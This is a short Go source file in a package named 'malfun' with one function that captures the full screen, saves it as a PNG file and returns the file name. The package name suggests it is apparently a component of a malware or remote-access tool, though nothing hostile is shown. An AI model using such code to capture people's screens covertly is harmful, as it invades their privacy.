package malfun

import (
	"os"
	"image"
	"image/png"
	"github.com/vova616/screenshot"
)

func SCREEN(imgid string) string {
	img, _ := screenshot.CaptureScreen()
	myImg := image.Image(img)
	img_name := imgid + ".png"
	file, _ := os.Create(img_name)
	defer file.Close()
	png.Encode(file, myImg)
	return img_name
}